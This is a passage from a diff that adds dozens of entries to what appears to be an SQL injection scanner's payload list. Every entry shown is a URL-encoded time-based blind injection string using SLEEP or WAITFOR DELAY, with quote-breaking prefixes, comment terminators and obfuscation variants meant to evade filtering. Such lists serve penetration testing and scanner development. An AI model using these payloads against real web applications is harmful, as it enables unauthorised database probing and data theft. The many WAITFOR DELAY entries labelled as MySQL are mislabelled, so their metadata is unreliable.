+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20AND%20(SECOND(IF(1=1,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20AND%20(SECOND(IF(1=1,SLEEP(SECOND(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20AND%20(SECOND(IF(1=1,SLEEP(SECOND(10)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20AND%20(SECOND(IF(1=1,SLEEP(time(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20and%20(SECOND(IF(1=1,SLEEP(time(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20AND%20(SECOND(IF(1=1,SLEEP(time(10)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20and%20(SECOND(IF(1=1,SLEEP(time(10)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20WAITFOR%20DELAY%20%00'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20WAITFOR%20DELAY%20%00'0:0:10'--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20WAITFOR%20DELAY%20%08'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20WAITFOR%20DELAY%20%08'0:0:10'--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20WAITFOR%20DELAY%20%11'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20WAITFOR%20DELAY%20%11'0:0:10'--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20WAITFOR%20DELAY%20%1D'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20WAITFOR%20DELAY%20%1D'0:0:10'--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20WAITFOR%20DELAY%20N'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20WAITFOR%20DELAY%20N'0:0:10'--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20or%20(LAST_DAY(IF(1=1,SLEEP(time(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20or%20(LAST_DAY(IF(1=1,SLEEP(time(10)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20or%20(SECOND(IF(1=1,SLEEP(REPEAT(10,%201)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20or%20(SECOND(IF(1=1,SLEEP(REPEAT(10,%201)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20or%20(SECOND(IF(1=1,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20or%20(SECOND(IF(1=1,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20or%20(SECOND(IF(1=1,SLEEP(SECOND(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20or%20(SECOND(IF(1=1,SLEEP(SECOND(10)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20or%20(SECOND(IF(1=1,SLEEP(time(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20or%20(SECOND(IF(1=1,SLEEP(time(10)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20WAITFOR%20DELAY%20%00'0:0:10'%20;--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20WAITFOR%20DELAY%20%08'0:0:10'%20;--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20WAITFOR%20DELAY%20%11'0:0:10'%20;--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20WAITFOR%20DELAY%20%1D'0:0:10'%20;--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20WAITFOR%20DELAY%20N'0:0:10'%20;--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20xor(SECOND(ELT(1453=1453,SLEEP(MOD(21,%2011)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20xor(SECOND(ELT(1453=1453,SLEEP(MOD(21,%2011)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20xor(SECOND(ELT(1453=1453,SLEEP(REPEAT(10,%201)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20xor(SECOND(ELT(1453=1453,SLEEP(REPEAT(10,%201)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20xor(SECOND(ELT(1453=1453,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20xor(SECOND(ELT(1453=1453,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20xor(SECOND(ELT(1453=1453,SLEEP(SECOND(10)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20xor(SECOND(ELT(1453=1453,SLEEP(SECOND(10)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20xor(SECOND(ELT(1453=1453,SLEEP(time(10)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20xor(SECOND(ELT(1453=1453,SLEEP(time(10)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20%7C%20sleep(time(10))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20%7C%20sleep(time(10))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20%7C(LAST_DAY(IF(1=1,SLEEP(time(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20%7C(LAST_DAY(IF(1=1,SLEEP(time(10)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20%7C(SECOND(ELT(1453=1453,SLEEP(MOD(21,%2011)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20%7C(SECOND(ELT(1453=1453,SLEEP(MOD(21,%2011)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20%7C(SECOND(ELT(1453=1453,SLEEP(REPEAT(10,%201)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20%7C(SECOND(ELT(1453=1453,SLEEP(REPEAT(10,%201)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20%7C(SECOND(ELT(1453=1453,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20%7C(SECOND(ELT(1453=1453,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20%7C(SECOND(ELT(1453=1453,SLEEP(SECOND(10)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20%7C(SECOND(ELT(1453=1453,SLEEP(SECOND(10)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20%7C(SECOND(ELT(1453=1453,SLEEP(time(10)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20%7C(SECOND(ELT(1453=1453,SLEEP(time(10)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "'%20%7C(SECOND(IF(1=1,SLEEP(time(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "')%20WAITFOR%20DELAY%20N'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "')%20WAITFOR%20DELAY%20N'0:0:10'--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "')%20WAITFOR%20DELAY%20N'0:0:10'%20;--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "';%20(SECOND(ELT(1453=1453,SLEEP(SECOND(10)))))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "';%20(SECOND(ELT(1453=1453,SLEEP(SECOND(10)))))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "';%20(SECOND(IF(1=1,SLEEP(REPEAT(10,%201)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "';%20(SECOND(IF(1=1,SLEEP(SECOND(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "';%20(SECOND(IF(1=1,SLEEP(SECOND(10)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "';%20(SECOND(IF(1=1,SLEEP(time(10)),0)))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "';%20(SECOND(IF(1=1,SLEEP(time(10)),0)))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "';%20WAITFOR%20DELAY%20%00'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "';%20WAITFOR%20DELAY%20%00'0:0:10'--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "';%20WAITFOR%20DELAY%20%08'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "';%20WAITFOR%20DELAY%20%08'0:0:10'--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "';%20WAITFOR%20DELAY%20%11'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "';%20WAITFOR%20DELAY%20%11'0:0:10'--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "';%20WAITFOR%20DELAY%20%1D'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "';%20WAITFOR%20DELAY%20%1D'0:0:10'--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "';%20WAITFOR%20DELAY%20N'0:0:10'",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "';%20WAITFOR%20DELAY%20N'0:0:10'--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "';%20SECOND(IF(1=1,SLEEP(REPLACE(\"19\",%20\"9\",%20\"0\")),0))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "';%20sleep(time(10))",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "';%20sleep(time(10))--",
+                "comments": [
+                    {"pref": "", "suf": ""},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
+                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
